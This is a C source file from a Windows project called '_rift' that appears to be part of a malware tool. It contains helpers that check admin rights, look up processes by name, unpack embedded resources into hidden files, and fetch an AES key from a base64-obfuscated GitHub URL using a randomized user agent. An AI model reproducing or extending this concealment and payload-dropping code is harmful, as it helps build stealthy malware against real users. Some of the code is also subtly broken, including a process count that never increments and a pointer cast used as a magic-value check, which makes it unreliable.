#include "pch.h"
#include "_rift.h"

BOOL IIsUserAdmin() {
	PSID pSId;
	BOOL bSId = AllocateAndInitializeSid(&(SID_IDENTIFIER_AUTHORITY)SECURITY_NT_AUTHORITY, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSId);
	if (bSId) {
		if (!CheckTokenMembership(0, pSId, &bSId))
			bSId = FALSE;

		FreeSid(pSId);
	}

	return bSId;
}

PVOID ELoadResourceW(
	_In_  WORD    wResID,
	_In_  PCWSTR  pResType,
	_Out_ PSIZE_T nBufferSize
) {
	HRSRC hResInfo = FindResourceW(0, MAKEINTRESOURCEW(wResID), pResType);
	if (hResInfo) {
		HGLOBAL hgData = LoadResource(0, hResInfo);
		if (hgData) {
			PVOID lpBuffer = LockResource(hgData);
			if (!lpBuffer)
				return 0;

			*nBufferSize = SizeofResource(0, hResInfo);
			if (!*nBufferSize)
				return 0;

			return lpBuffer;
		}
	}

	return 0;
}

PDWORD EGetProcessIdbyName(
	_In_  PCWSTR  pProcessName,
	_Out_ PSIZE_T nProcesses
) {
	HANDLE hPSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hPSnap == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	PDWORD pProcesses = 0;
	if (Process32FirstW(hPSnap, &pe32)) {
		*nProcesses = 0;
		do {
			if (!lstrcmpiW(pe32.szExeFile, pProcessName)) {
				if (pProcesses)
					pProcesses = ReAllocMemory(pProcesses, sizeof(DWORD) * *nProcesses);
				else
					pProcesses = AllocMemory(sizeof(DWORD));

				pProcesses[*nProcesses] = pe32.th32ProcessID;
			}
		} while (Process32Next(hPSnap, &pe32));
	}

	CloseHandle(hPSnap);
	return pProcesses;
}

PVOID AllocReadFileW(
	_In_  PCWSTR  szFileName,
	_Out_ PSIZE_T nFileSize
) {
	PVOID pRet = 0;
	HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return 0;

	LARGE_INTEGER liFS;
	BOOL bT = GetFileSizeEx(hFile, &liFS);
	if (!bT || (liFS.HighPart || !liFS.LowPart))
		goto EXIT;

	PVOID pFile = AllocMemory(liFS.LowPart);
	if (!pFile)
		goto EXIT;

	bT = ReadFile(hFile, pFile, liFS.LowPart, nFileSize, 0);
	if (!bT) {
		FreeMemory(pFile);
		goto EXIT;
	}

	pRet = pFile;
EXIT:
	CloseHandle(hFile);
	return pRet;
}

BOOL WriteFileCW(
	_In_ PCWSTR pFileName,
	_In_ PVOID  pBuffer,
	_In_ SIZE_T nBuffer
) {
	HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
	if (hFile) {
		DWORD dwT;
		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, 0);
		CloseHandle(hFile);

		return bT;
	}
	else
		return FALSE;
}

PCWSTR GetFileNameFromPathW(
	_In_ PCWSTR pPath
) {
	SIZE_T nResult;
	StringCchLengthW(pPath, MAX_PATH, &nResult);

	for (UINT16 i = nResult; i > 2; i--) {
		if (pPath[i - 1] == L'\\')
			return pPath + i;
	}

	return 0;
}

BOOL EExtractResource(
	_In_ PCWSTR szFileName,
	_In_ WORD   wResID
) {
	SIZE_T nData;
	PVOID pData = EUnpackResource(&g_PIB->cibWK, wResID, &nData);
	BOOL bT = WriteFileCW(szFileName, pData, nData);
	FreeMemory(pData);
	return bT;
}

// Only Test rn but might be implemented further
PVOID IDownloadKey() {
	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hNet)
		return 0;
	FreeMemory(szAgent);

	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
	SIZE_T nURL;
	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
	if (!hUrl)
		return 0;
	FreeMemory(szURL);

	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);

	SIZE_T nRead;
	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);

	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
		goto EXIT;

	return pBuffer;
EXIT:
	FreeMemory(pBuffer);
	return 0;
}